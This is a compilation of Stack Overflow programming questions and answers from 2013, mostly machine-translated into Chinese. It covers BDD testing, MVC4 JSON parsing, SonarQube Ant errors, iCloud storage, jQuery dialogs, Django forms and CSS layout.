I am afraid I have some misconceptions about BDD. I am too specific in my scenario ? If yes, where should I stop ?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T11:46:50.157

I'm not sure your question is BDD specific but its still a good one.

I would normally recommend that all development is done with a continuous integration server running your tests every time you checkin, even for a private project that you work alone on. Even my own personal projects get this because TeamCity is free and the kids desktop at home is idle when I check in. The importance if this is more obvious if you work in a team, because it stops there ever being any doubt when you get the latest source code that it will build.

But it also stops the problem you have. You can tell very quickly when something is too specific because it doesn't work on both your own personal machine and the build machine. These problems exist whether you work in BDD, TDD, ATDD or any kind of testing.

Looking at your above example, I'd say it is very specific and also very brittle. If the third party PC is switched off one day, all your tests fail. If you were using Specflow to run unit tests then I'd recommend mocking most of your code so you can test without calling the test pc, but your example reads more like you are trying to do system/integration testing.

Instead of specifying all your parameters individually, why not give a name to whole bundle

```
Given Im using the test pc 
```

you can then set many of them up in the binding and if you need to then tailor them so the tests still pass

```
[Given]
public void GivenImUsingTheTestPc()
{
  if (Environment.ComputerName == "d1234")
  {
    ipadress = 1.2.3.4;
    .... 
```

This obviously only moves the brittleness but at least it keeps you going for now

# javascript - 通过 MVC4 传递（和解析！）JSON 对象

> ID：14977299
> 
> 赞同：1
> 
> 时间：2013-02-20T10:15:12.117
> 
> 标签：javascript, asp.net-mvc, json

我对应该如何在 MVC 中使用 JSON 对象以及它们应该如何从 Controller 传递到 View 再到 Jscript 感到困惑。

我也不确定我是否在正确的点正确解析 JSON 对象......

我的**控制器**返回一个带有**json**对象的**PartialView （“***变量*”是一个数据列表，例如*Id=2012, Name=BillyJoel, Value="£2,000"*）：

 ****```
public ActionResult JavascriptConstants() {
    var variables = Service.Obtain<VariableService>().All().ToList();
    var json = new JavaScriptSerializer().Serialize(variables);
    return PartialView("JavascriptConstants", json);
} 
```

然后，我的**视图**通过创建此变量使这些数据可用于我的脚本：

```
@model string
...
var mvcListOfVariablesInDB = '@Html.Raw(Json.Encode(Model))'; 
```

然后我的**Jscript 文件**访问数据并尝试提取信息和键值对，但似乎将 JSON 解释为字符串：

```
var variableList = $.parseJSON(mvcListOfVariablesInDB);

for (var variable in variableList) {
    alert(variableList[variable]);
} 
```

`"`这只是在显示字符串的每个字符时返回、`[`、`{`等的警报。如何访问 JSON 对象的键值？

我尝试将我的 JS 更改为使用：

```
var variableList = $.parseJSON(mvcListOfVariablesInDB); 
```

但这只是`Uncaught SyntaxError: Unexpected token I`在我的浏览器中给了我一个错误（我假设当它点击“Id”的“I”时）。

非常感谢任何帮助，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T12:50:34.400

我发现了问题：

问题在于使用，`JavaScriptSerializer().Serialize(foo)`因为这是创建一个包含换行符和制表符的 JSON 对象，而不是用`\n`and替换它们`\t`。

`$.parseJSON()`无法处理换行符，因此会引发意外的令牌错误。

通过导入**`JSON.NET`**包并使用以下方法更正了此问题：

```
 var json = JsonConvert.SerializeObject(variables); 
```

这传递了一个 JSON 对象，其中换行符和制表符替换为`\n`'s 和`\t`'s。然后可以使用以下方法访问视图：

```
@model string
...
var mvcListOfVariablesInDB = '@Html.Raw(Json.Encode(Model))'; 
```

最后在脚本中使用：

```
var variableList = $.parseJSON(mvcListOfVariablesInDB) 
```

希望有一天这对其他人有所帮助...****

# image - 打开图形单个图像但显示多个

> ID：14977300
> 
> 赞同：2
> 
> 时间：2013-02-20T10:15:13.213
> 
> 标签：image, facebook-opengraph

我们使用 og:image 属性为 facebook 提供正确的图像，但在某些情况下，它会从 DOM 中解析出更多图像。例如：

[http://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Ffunda.nl%2Fkoop%2Futrecht%2Fappartement-48611144-breedstraat-122%2F&t=Woning+te+koop%3A+ Breedstraat+122%2C+乌得勒支](http://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Ffunda.nl%2Fkoop%2Futrecht%2Fappartement-48611144-breedstraat-122%2F&t=Woning+te+koop%3A+Breedstraat+122%2C+Utrecht)

只有第一张图像应该在那里显示。如果您查看调试器，它看起来不错：

[http://developers.facebook.com/tools/debug/og/object?q=http%3A%2F%2Fwww.funda.nl%2Fkoop%2Futrecht%2Fappartement-48611144-breedstraat-122%2F](http://developers.facebook.com/tools/debug/og/object?q=http%3A%2F%2Fwww.funda.nl%2Fkoop%2Futrecht%2Fappartement-48611144-breedstraat-122%2F)

有谁知道这里发生了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-15T12:48:48.310

我刚刚在我维护的网站中遇到了这个问题。看起来该死的 Facebook 再次改变了一切，却没有通知开发者任何事情。og:image 的图像现在必须至少为 200x200px。如果它更小，那么 facebook 将采用它从同一 URL 解析的其他图像，即使这些图像与该 URL 的主要图像无关。只要注意 og:image 足够大就可以了。* 请注意，即使您更改了它，如果 URL 已经缓存在 FB 中，它可能会在一段时间内出现错误。要立即解决它，只需再次将 URL 传递给 FB 调试器。

# ruby-on-rails - Ruby On Rails validates_uniqueness_of 与范围和日期范围

> ID：14977303
> 
> 赞同：0
> 
> 时间：2013-02-20T10:15:32.507
> 
> 标签：ruby-on-rails, ruby, validation

是否可以仅在 car.created_at > 6.months.ago 的情况下使用 validates_uniqueness_of 汽车？

就我而言，

```
validates_uniqueness_of :car, :scope => [:dealer_id, :type], :on => :create 
```

仅当最后使用此数据创建的汽车是在 6.months.ago 之前创建的时，才应允许为相同的dealer_id 和相同的类型创建汽车

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T11:08:36.143

你可能可以做这样的事情。

```
validate :be_a_new_car, :on=>:create

def be_a_new_car
 old_car = self.class.where(:car=>self.car,:dealer_id=>self.dealer_id,:type=>self.type)
           .where("created_at < ?",6.months.ago).first
 self.errors.add(:car, "not old enough to be unique") if old_car
end 
```

# web-essentials - Web Essentials 是否删除了 Less 编辑器？

> ID：14977305
> 
> 赞同：5
> 
> 时间：2013-02-20T10:15:46.707
> 
> 标签：web-essentials

我刚刚更新了 Web Essentials，现在我没有语法突出显示或编译。在更改说明中，我可以看到 2.5 版中的“已删除 LESS/CoffeeScript 编辑器”，但更少的选项仍然存在？！。

什么？为什么？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-02-20T17:34:41.143

LESS 编辑器作为 Visual Studio 2012 的官方功能移至 Web 工具 2012.2。

这是包含更多信息和下载选项的链接。

[http://madskristensen.net/post/Web-Tools-20122-and-Web-Essentials.aspx](http://madskristensen.net/post/Web-Tools-20122-and-Web-Essentials.aspx)

# ant - SONAR - java.lang.IllegalStateException：${SQLSCRIPT} 的属性插值中的无限循环：SQLSCRIPT

> ID：14977307
> 
> 赞同：2
> 
> 时间：2013-02-20T10:15:52.900
> 
> 标签：ant, sonarqube

我有非常简单的带有 Ant 任务的声纳配置：

```
<target name="upload_to_sonar">
  <property name="sonar.jdbc.url" value="jdbc:oracle:thin:@server:1521:sid"/>
  <property name="sonar.host.url" value="http://sonar:80"/>
  <property name="sonar.jdbc.username" value="SONAR"/>
  <property name="sonar.jdbc.password" value="SONAR"/>
  <property name="sonar.projectKey" value="test"/>
  <property name="sonar.projectName" value="test"/>
  <property name="sonar.projectVersion" value="trunk"/>
  <property name="sonar.language" value="java"/>
  <property name="sonar.sources" value="sources_for_sonar"/>
  <property name="sonar.binaries" value="classes_for_sonar"/>

  <taskdef name="sonar" classname="org.sonar.ant.SonarTask">
    <classpath path="${EXTERNAL}/sonar-ant-task-2.0.jar" />
  </taskdef>
  <sonar/>
</target> 
```

这些文件夹包含根级别的源和类。
出于某种原因，无论我如何配置它，执行都会给我以下错误：

```
Buildfile: D:\trunk\src\build.xml

upload_to_sonar:
[sonar:sonar] Apache Ant(TM) version 1.8.2 compiled on December 20 2010
[sonar:sonar] Sonar Ant Task version: 2.0
[sonar:sonar] Loaded from: file:/D:/trunk/src/./sources/external/sonar-ant-task-
2.0.jar
[sonar:sonar] Sonar work directory: D:\trunk\src\.sonar
[sonar:sonar] Sonar server: http://sonar:80

BUILD FAILED
D:\trunk\src\build.xml:132: org.sonar.runner.RunnerException: java.lang.IllegalS
tateException: Infinite loop in property interpolation of ${SQLSCRIPT}: SQLSCRIP
T
        at org.sonar.runner.Runner.delegateExecution(Runner.java:288)
        at org.sonar.runner.Runner.execute(Runner.java:151)
        at org.sonar.ant.SonarTask.launchAnalysis(SonarTask.java:93)
        at org.sonar.ant.SonarTask.execute(SonarTask.java:75)
        at org.apache.tools.ant.UnknownElement.execute(UnknownElement.java:291)
        at sun.reflect.GeneratedMethodAccessor4.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAcces
sorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.apache.tools.ant.dispatch.DispatchUtils.execute(DispatchUtils.jav
a:106)
        at org.apache.tools.ant.Task.perform(Task.java:348)
        at org.apache.tools.ant.Target.execute(Target.java:390)
        at org.apache.tools.ant.Target.performTasks(Target.java:411)
        at org.apache.tools.ant.Project.executeSortedTargets(Project.java:1399)
        at org.apache.tools.ant.Project.executeTarget(Project.java:1368)
        at org.apache.tools.ant.helper.DefaultExecutor.executeTargets(DefaultExe
cutor.java:41)
        at org.apache.tools.ant.Project.executeTargets(Project.java:1251)
        at org.apache.tools.ant.Main.runBuild(Main.java:809)
        at org.apache.tools.ant.Main.startAnt(Main.java:217)
        at org.apache.tools.ant.launch.Launcher.run(Launcher.java:280)
        at org.apache.tools.ant.launch.Launcher.main(Launcher.java:109)
Caused by: java.lang.IllegalStateException: Infinite loop in property interpolat
ion of ${SQLSCRIPT}: SQLSCRIPT
        at org.apache.commons.lang.text.StrSubstitutor.checkCyclicSubstitution(S
trSubstitutor.java:701)
        at org.apache.commons.lang.text.StrSubstitutor.substitute(StrSubstitutor
.java:645)
        at org.apache.commons.lang.text.StrSubstitutor.substitute(StrSubstitutor
.java:656)
        at org.apache.commons.lang.text.StrSubstitutor.substitute(StrSubstitutor
.java:563)
        at org.apache.commons.lang.text.StrSubstitutor.replace(StrSubstitutor.ja
va:305)
        at org.apache.commons.configuration.PropertyConverter.interpolate(Proper
tyConverter.java:958)
        at org.apache.commons.configuration.AbstractConfiguration.interpolate(Ab
stractConfiguration.java:446)
        at org.apache.commons.configuration.CompositeConfiguration.getList(Compo
siteConfiguration.java:312)
        at org.apache.commons.configuration.AbstractConfiguration.getList(Abstra
ctConfiguration.java:1109)
        at org.apache.commons.configuration.CompositeConfiguration.getStringArra
y(CompositeConfiguration.java:320)
        at org.sonar.batch.Batch.convertToProperties(Batch.java:89)
        at org.sonar.batch.Batch.create(Batch.java:78)
        at org.sonar.runner.internal.batch.Launcher.executeBatch(Launcher.java:6
8)
        at org.sonar.runner.internal.batch.Launcher.execute(Launcher.java:61)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.
java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAcces
sorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.sonar.runner.Runner.delegateExecution(Runner.java:285)
        ... 19 more

Total time: 1 minute 12 seconds 
```

SONAR 服务器版本是 3.2
Ant 任务版本 2.0
启用详细信息不提供任何其他详细信息

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-21T12:06:00.037

[为社区http://jira.codehaus.org/browse/SONARPLUGINS-2704](http://jira.codehaus.org/browse/SONARPLUGINS-2704)创建了一张票

# iphone - 如何在 iPhone 中设置 iCloud 根？

> ID：14977311
> 
> 赞同：2
> 
> 时间：2013-02-20T10:16:02.900
> 
> 标签：iphone, ios6, icloud

在这里，我为文档存储创建了本地根目录，但我想实现 iCloud。所以我需要创建 iCloud 根目录，并且我会检查 iCloud 是否可用。如果可以创建类似的方法。在这里我添加了我的本地根方法代码

```
- (NSURL *)localRoot {

if (_localRoot != nil) {
    return _localRoot;
}

NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);

NSString *documentsDirectory = [paths objectAtIndex:0];

NSString *artdirectoryPath = [documentsDirectory stringByAppendingPathComponent:@"/Me"];

_localRoot=[[NSURL alloc]initFileURLWithPath:artdirectoryPath];

return _localRoot;
  } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T18:47:33.880

您可以使用以下命令找到 iCloud“根”目录：

```
NSURL *url = [[NSFileManager defaultManager] URLForUbiquityContainerIdentifier:nil]; 
```

如果您的应用只有一个通用容器，则可以传递`nil`参数，否则必须传递容器标识符。

您还可以使用它来检查您的应用程序是否可以使用 iCloud——如果它返回`nil`，则您不能使用 iCloud。不过，这不是检查可用性的最佳方法，因为它可能会阻塞一段时间。要进行快速、非阻塞检查，请使用以下命令：

```
id token = [[NSFileManager defaultManager] ubiquityIdentityToken]; 
```

然后一定要观察`NSUbiquityIdentityDidChangeNotification`以防可用性发生变化。

但是：这还远远不足以开始使用 iCloud 存储文档。您不能只读取/写入该目录中的文件并让 iCloud 做正确的事情。您至少需要：

*   `NSMetadataQuery`查找存在于云服务器上但未在本地下载的文档。
*   `-[NSFileManager startDownloadingUbiquitousItemAtURL:error:]`告诉 iCloud 开始下载您使用元数据查询找到的文档。
*   通过 协调访问`NSFileCoordinator`，并通过 通知更改`NSFilePresenter`。

Apple 有很多文档和来自 WWDC 的视频，这将有助于解决这个问题。

# jquery - Jquery Dialog 不等待用户输入和服务器端事件立即触发

> ID：14977314
> 
> 赞同：0
> 
> 时间：2013-02-20T10:16:21.247
> 
> 标签：jquery, asp.net, jquery-ui

我有一个`GirdView`，里面`Girdview`有一个`Checkbox`专栏。`Checkbox` `AutoPostback`属性设置为，`TRUE`因为我正在对`Checkbox` `checked`状态进行一些数据库工作。现在我用BUt替换普通`javascript confirm`框，问题是当用户出现对话框时，用户必须确认他们是否确定要选中复选框，如果他们按下yse，则选中复选框，然后我想要服务器端事件 t 触发。相反，一旦用户选中复选框，服务器端事件就会触发，然后即使他们按下 NO，也会出现对话框，数据库已经更新为 YES。`Jquery` `DialogBox``check``checkbox`

这是我的代码。

# HTML

```
<asp:GridView ID="gvOrders" runat="server" AutoGenerateColumns="false"
CssClass="gvClickCollectOrders" DataKeyNames="OrderId" OnRowDataBound="gvOrders_RowDataBound"
AllowPaging="true" OnPageIndexChanging="gvOrders_PageIndexChanging">
    <Columns>
        <asp:BoundField DataField="OrderId" Visible="false" />
        <asp:BoundField DataField="OrderNumber" HeaderText="Order No" DataFormatString="WWW {0}"
        />
        <asp:TemplateField HeaderText="Order Date">
            <ItemTemplate>
                <asp:Label ID="orderDateText" Text="" runat="server"></asp:Label>
            </ItemTemplate>
        </asp:TemplateField>
        <asp:TemplateField HeaderText="Order Ship Date">
            <ItemTemplate>
                <asp:HyperLink ID="orderShipDateAndTrackingData" CssClass="trackingInfo"
                runat="server" Target="_blank" Text="" NavigateUrl=""></asp:HyperLink>
            </ItemTemplate>
        </asp:TemplateField>
        <asp:TemplateField HeaderText="Customer Name">
            <ItemTemplate>
                <%# Eval( "BillToFirstName") %>&nbsp;
                    <%# Eval( "BillToLastName") %>
            </ItemTemplate>
        </asp:TemplateField>
        <asp:TemplateField HeaderText="Received In Store">
            <ItemTemplate>
                <asp:CheckBox ID="cbIsReceived" runat="server" AutoPostBack="true" Checked='<%# MWClickAndCollectHelper.CheckOrderReceivedStatus(AlwaysConvert.ToInt(Eval("OrderId"))) %>'
                OnCheckedChanged="cbIsReceived_CheckedChanged" CssClass="isReceivedCheckBox"
                />
                <asp:Label ID="receivedDateText" Text="" runat="server"></asp:Label>
            </ItemTemplate>
        </asp:TemplateField>
        <asp:TemplateField HeaderText="Collected By Customer">
            <ItemTemplate>
                <asp:CheckBox ID="cbIsCollected" runat="server" AutoPostBack="true" Checked='<%# MWClickAndCollectHelper.CheckOrderCollectedStatus(AlwaysConvert.ToInt(Eval("OrderId"))) %>'
                OnCheckedChanged="cbIsCollected_CheckedChanged" CssClass="isCollectedCheckBox"
                />
                <asp:Label ID="collectedDateText" Text="" runat="server"></asp:Label>
            </ItemTemplate>
        </asp:TemplateField>
    </Columns>
    <EmptyDataTemplate>
        <asp:Label ID="emptyGrid" runat="server" Text="There are no 'Click and Collect' orders placed for this store."
        CssClass="emptyGridMessage"></asp:Label>
    </EmptyDataTemplate>
</asp:GridView> 
```

# jQuery

```
< script type = "text/javascript" >

var isReceivedCheckBox = $('.isReceivedCheckBox input[type=checkbox]');
var isCollectedCheckBox = $('.isCollectedCheckBox input[type=checkbox]');
var def = $.Deferred();

function confirmDialog(msg) {
    var dialog = $("<div id=\"dialog\">" + msg + "</div>");
    $(dialog).dialog({
        autoOpen: true,
        width: 300,
        height: 200,
        resizable: false,
        modal: false,
        buttons: {
            'Yes': function () {
                def.resolve();
                $(this).dialog("close");
            },
                'No': function () {
                def.reject();
                $(this).dialog("close");
            }
        },
        close: function () {
            $(this).remove();
        }
    });
    return def.promise();
}

$(function () {
    $(isReceivedCheckBox).on("change", function () {
        var checked = this.checked;
        var checkbox = this;
        if (checked) {
            confirmDialog("are your sure you want to check this checkbox?").done(function () {
                checkbox.checked = true;
            })
                .fail(function () {
                checkbox.checked = false;
            });
        } else {
            confirmDialog("are your sure you want to uncheck this checkbox?").done(function () {
                checkbox.checked = false;
            })
                .fail(function () {
                checkbox.checked = true;
            });
        }
    });
}); < /script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:36:26.217

不确定是否有其他方法，但您可以手动进行回发。设置 AutoPostBack = false 并使用 __doPostBack 函数。

[www.ilearnttoday.com/tag/how-to-use-__dopostback](http://www.ilearnttoday.com/tag/how-to-use-__dopostback)

# php - PhpRenderer 没有从控制台路由渲染我的视图脚本

> ID：14977315
> 
> 赞同：0
> 
> 时间：2013-02-20T10:16:22.393
> 
> 标签：php, zend-framework2

我在我的 zf2 应用程序上创建了一个控制台路由，以通过命令行发送电子邮件。因此，在我的操作中，我正在按照文档（[http://framework.zend.com/manual/2.0/en/modules/zend.view.renderer.php-renderer.html](http://framework.zend.com/manual/2.0/en/modules/zend.view.renderer.php-renderer.html)）中的规定创建一个新的 PhpRenderer 来呈现我的电子邮件模板（替换变量等）并调度它。

这是我正在使用的代码：

```
 $renderer = new \Zend\View\Renderer\PhpRenderer();
  $resolver = new \Zend\View\Resolver\TemplateMapResolver();

  $resolver->setMap(array(
    'mailTemplate' => $config['template']
  ));

  $renderer->setResolver($resolver);

  $model = new \Zend\View\Model\ViewModel();
  $model->setTemplate('mailTemplate');

  $model->setVariables(array(
    'recipient' => 'foo@bar.com'
  ));

  $emailBody = $renderer->render($model); 
```

但是，似乎 Phprenderer 没有在我的`.phtml`文件中呈现任何 PHP。但是，如果我在正常的 HTTP 请求中执行它，完全相同的代码可以正常工作。

谁能帮我解决这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-25T20:25:40.640

我怀疑这是因为您没有为解析器设置正确的路径。

作为参考，这是我采用的方法：

```
 // render HTML and TEXT bodies
    $basePath = realpath(__DIR__ . '/../../../view/emails');

    $htmlFilename = 'body.html.phtml';
    $txtFilename = 'body.txt.phtml';

    $renderer = new PhpRenderer();
    $renderer->resolver()->addPath($basePath);

    $sm = $this->getServiceManager();
    $renderer->setHelperPluginManager($sm->get('ViewHelperManager'));

    $model = new ViewModel();
    $model->setVariable('name', $user->getName());

    $model->setTemplate($txtFilename);
    $textContent = $renderer->render($model);

    $model->setTemplate($htmlFilename);
    $htmlContent = $renderer->render($model); 
```

# django - Django在POST上返回空白页

> ID：14977319
> 
> 赞同：0
> 
> 时间：2013-02-20T10:16:44.647
> 
> 标签：django, django-forms, django-templates, django-views

这几乎可以肯定是一个新手错误，但我无法弄清楚出了什么问题。我已经阅读了此处的其他类似问题，但似乎并非完全相同。

我有一个发布数据的简单表格，但我总是得到一个完全空白的回复。

这是代码：

网址.py

```
urlpatterns = patterns('shotgun.views',
    # shotgun App URL patterns
    url(r'^$', ControlPanelView.as_view(), name='index'),
) 
```

表格.py

```
class ProjectAssignmentForm(forms.Form):

    projects = MultipleChoiceField(widget=forms.CheckboxSelectMultiple)

    def __init__(self, user_projs, *args, **kwargs):
        super(ProjectAssignmentForm, self).__init__(*args, **kwargs)

        self.fields["projects"].choices = tuple([(item.name, item.name) for item in SGProject.objects.all() if item.name != "Template Project"])
        self.fields["projects"].initial = user_projs 
```

视图.py

```
class ControlPanelView(SLBaseView):

    template_name = "shotgun/index.html"

    def get_context_data(self, **kwargs):
        context = super(ControlPanelView, self).get_context_data(**kwargs)

        sg_user = SGCustomNonProjectEntity01.objects.filter(code=self.request.user.get_full_name())[0]
        projs = SGProject.objects.filter(Q(entities__entity_id=sg_user.id), Q(entities__type="CustomNonProjectEntity01"))

        context["assigned_projs"] = projs

        if self.request.method == "POST":
            form = ProjectAssignmentForm(projs, self.request.POST)
            if form.is_valid():
                 # update user projects logic
        else:
            form = ProjectAssignmentForm(projs)

        context["pas_form"] = form

        return context 
```

模板.html

```
<div class="full_width" >
    <h4 class="no_pad" >{{ user.first_name|upper }}'S CONTROL PANEL</h4>
</div>

<div class="full_width top_tab">
    <div class="border border_pad">
    <h6>PROJECTS YOU ARE ASSIGNED TO</h6>
    {% if assigned_projs %}
        <form action="/intranet/shotgun/" method="post">{% csrf_token %}
            <div class="border_pad">
                {{ pas_form.projects.errors }}
                {{ pas_form.projects }}
                <input type="submit" value="Update" />
            </div>
        </form>
    {% else %}
        <p>You are not assigned to any projects.</p>
    {% endif %}
    </div>
</div> 
```

我在 settings.py 中启用了 csrf 中间件

我对这一切的期望是：

*   未绑定表单 - 显示带有预填充数据的页面*   绑定无效 - 显示包含所选数据的页面*   绑定有效 - 显示更新数据的页面

未绑定的数据页面按预期显示，但一旦通过单击表单上的更新按钮创建发布请求，就会显示一个空白页面。我尝试在语句之后抛出异常，`if self.request.method == "POST"`但代码似乎并没有走到这一步。我真的不确定发生了什么。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-02-25T16:42:23.737

您的 views.py 文件中存在语法错误。

```
 if self.request.method == "POST":
    form = ProjectAssignmentForm(projs, self.request.POST) 
```

应该

```
 if self.request.method == "POST":
        form = ProjectAssignmentForm(projs, self.request.POST) 
```

你有没有关闭调试？这可以解释为什么你没有得到任何输出。因为有一个致命错误，django 会打印一个错误报告，但如果调试关闭，它会将错误报告通过电子邮件发送给 settings.py 中列出的管理员。

在 settings.py 中检查：

```
DEBUG = True 
```

# jquery - 是否可以使用伪元素使包含元素环绕绝对定位的元素（如 clearfix）？

> ID：14977324
> 
> 赞同：1
> 
> 时间：2013-02-20T10:16:59.857
> 
> 标签：jquery, css, responsive-design, fluid-layout, pseudo-element

我正在为我的网站制作一个轻量级的响应式 jQuery 滑块，并使用非常常见的标记：

**HTML：**

```
<div id="slider">
  <ul>
    <li><img class="active" src="slide1.jpg" alt=""></li>
    <li><img src="slide2.jpg" alt=""></li>
    <li><img src="slide3.jpg" alt=""></li>
  </ul>
</div> 
```

**CSS：**

```
#slider {
  width:80%;
  max-width:800px;
  margin:0 auto;
}

#slider ul {
  margin:0px;
  padding:0px;
  list-style:none;
  width:100%;
}

#slider ul li {
  width:100%;
  position:relative;
}

#slider img {
  width:100%;
  position:absolute;
  top:0px;
  box-shadow:0px 20px 40px rgba(0,0,0,.66);
}

#slider img.active {
  z-index:1;
} 
```

我遇到的问题是我的绝对定位幻灯片正在做他们应该做的事情，并将它们从页面结构中删除。（这不是我想要他们做的，但这是堆叠它们的简单方法）。

我今天一直在阅读有关 CSS 伪元素的内容以及人们使用它们所做的所有很酷的事情。这让我想到......它们可以用来“清除”这些绝对定位的元素吗？我的想法是，可能有一种方法可以执行以下操作：

```
#slider img:before {
  content:"";
  display:block;
  position:static;
} 
```

显然，要实现这一点，需要的不仅仅是那些样式（因为它没有按照我想要的方式呈现东西......我知道此时你可能在想“为什么不只指定容器的高度并完成用它吗？”。好吧，幻灯片是为了在它们收缩时做出响应，容器的高度也是如此。

我真的想尽可能多地做到这一点，而不是求助于 jQuery 来设置容器相对于图像高度的高度......这很诱人，但我认为有办法解决这个问题......

我在网上（还）找不到任何关于如何做到这一点（或者如果可能的话）的信息。一些 CSS 大师可以站出来帮助我吗？我很想听听堆叠幻灯片的替代方法，或者（主要）是否可以使用伪元素来保留我绝对定位的图像周围的容器高度......

**更新：**这里的 jsFiddle：http: [//jsfiddle.net/derekmx271/Hu6Yf/](http://jsfiddle.net/derekmx271/Hu6Yf/)

**更新：**接近解决方案（只需要锁定与幻灯片相同的尺寸）:) [http://jsfiddle.net/derekmx271/T7A7M/](http://jsfiddle.net/derekmx271/T7A7M/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T11:58:18.580

有许多不同的方法可以实现滑块/轮播系统（在术语或标记、JavaScript 和 CSS 方面），如果您发现其中一种方法不太有效，那么重新考虑方法通常是个好主意。据我所知，你在问什么`:before`并且`:after`不会工作，因为一旦一个元素被绝对定位，它就会停止监听任何其他元素的影响（保存 - 在某些情况下 - 它是位置父元素）。

正是由于上述原因，我一直希望有一种新的显示模式，例如`display: stack`或其他什么......但唉，还没有:)

### 要求

如果我理解正确，您想要的是让您的“容器”假设您的 UL 中最大图像的大小，但您希望这些项目彼此堆叠。就我的 CSS 知识而言，其中一件事情必须改变，因为你不能两者都做——除非你想尝试[flexbox](http://www.html5rocks.com/en/tutorials/flexbox/quick/)可能提供的可能性？

### 问题

我知道（在 flexbox 之外）堆叠元素的唯一方法是使用`position: absolute`并且一旦您在元素上使用绝对定位，在计算其父元素的尺寸时将不再考虑该元素。您可以使用`position: relative`，但这通常需要手动/代码干预来指定确切的位置。

### 可用选项

1.  使用正负相对定位（或边距）来保持元素的定位——这会使你的 JavaScript 开发更加困难，但意味着元素会在文档中保留它们的空间。

2.  使用`display: table`or `float: left` *（具有足够的容器宽度）*将所有元素置于一条水平线上——这将保持你的高度，但意味着你会限制你的过渡效果*（除非你使用 JavaScript 将这一行元素复制到单独的层中）*。

3.  您的 JS 可以隐藏原始图像（使用`visibility: hidden`因为这意味着元素仍然占用空间），然后只使用克隆的绝对定位图像。通过摆弄隐藏图像的 css 布局，您仍然可以保留这些“幻影”元素生成的最大高度。

4.  归根结底，由于大多数轮播系统都需要 JavaScript 才能工作，您不妨在 JS 中定义容器的尺寸（正如您提到的）并完成它。保持元素绝对定位将使您的编码工作更轻松。

5.  查看 flexbox 并查看它是否具有堆叠元素的能力。

6.  可以使用 CSS 转换来堆叠元素，但是我的经验表明您可能会在视觉上得到您想要的，但是转换后的元素通常会在文档的其他地方留下“幻影”空间。

### 更新

关于通过`content`using添加图像`:before`，`:after`您将无法控制尺寸。您可能可以通过背景设置图像，这将允许您缩放它们（使用`background-size`），但我不确定这将如何让您在构建轮播时更轻松，因为您必须将这些图像 URL 硬编码到CSS 而不是使用标记...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:19:42.570

对于 clearfix，试试这个 CSS：

```
#slider img:after {
    clear: both;
}
#slider img:before, #slider img:after {
    content: " ";
    display: block;
    height: 0;
    overflow: hidden;
    visibility: hidden;
    width: 0;
} 
```

# node.js - Meteor 客户端同步服务器数据库调用

> ID：14977327
> 
> 赞同：2
> 
> 时间：2013-02-20T10:17:15.717
> 
> 标签：node.js, mongodb, meteor

我正在 Meteor 中构建一个依赖于数据库实时更新的应用程序。Meteor 列出示例的方式是将数据库调用置于模板调用之下。我发现在处理中等大小的数据集时，这变得不切实际。我正在尝试将请求移至服务器，并将结果传递回客户端。

我查看了有关 SA 的[类似](https://stackoverflow.com/questions/10274679/invoke-a-client-js-function-in-meteor-after-getting-results-from-the-server) [问题](https://stackoverflow.com/questions/13368456/meteor-callfunction-arg-not-occurring-synchronously)，但没有立即找到答案。

这是我的服务器端功能：

```
 Meteor.methods({
    "getTest" : function() {
                   var res = Data.find({}, { sort : { time : -1 }, limit : 10 });
                   var r = res.fetch();
                   return (r);
                }
    }); 
```

和客户端：

```
 Template.matches._matches = function() {
        var res= {};
        Meteor.call("getTest", function (error, result) {
            res = result;
        });
        return res;
    } 
```

我已经尝试了上述代码的变体 - 作为一个示例返回回调函数。据我所知，有一个回调使函数异步，所以它不能被调用 onload（同步）并且必须从客户端调用。

我想通过服务器端的所有数据库查询来减轻前端负载。这在 Meteor 中可行吗？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T11:08:37.010

这样做的方法是使用订阅而不是远程方法调用。请参阅文档中的[`counts-by-room`示例](http://docs.meteor.com/#meteor_publish)。因此，对于每个数据库调用，您都有一个仅存在于客户端的集合。然后，服务器使用`set`和决定集合中的记录`unset`。

# html - 定位一个 进入另一个

> ID：14977332
> 
> 赞同：0
> 
> 时间：2013-02-20T10:17:25.237
> 
> 标签：html, position

我只是试图做一个正常的导航，但我似乎失败了，因为我已经很长时间没有做过这样的事情了。所以这就是我得到的：

```
<div id="Top">
<div id="Navi">&nbsp;
<div class="Link">
<a href="index.php?s=link1">link1</a>
</div>
<div class="Link">
<a href="index.php?s=link2">link2</a>
</div>
</div>
</div> 
```

和：

```
#Top {
width:100%;
min-height:100px;
height:15%;
max-height:200px;
background-color:#C6E466;
border-bottom-width:2px;
border-bottom-style:solid;
border-bottom-color:#4E6011;
position:relative;
}
#Navi {
width:100%;
position:absolute;
top:-1px;
left:-5px;
}
.Link {
height:20px;
margin-left:10px;
min-width:150px;
width:10%;
max-width:200px;
float:left;
background-color:#121212;
color:white;
text-decoration:none;
} 
```

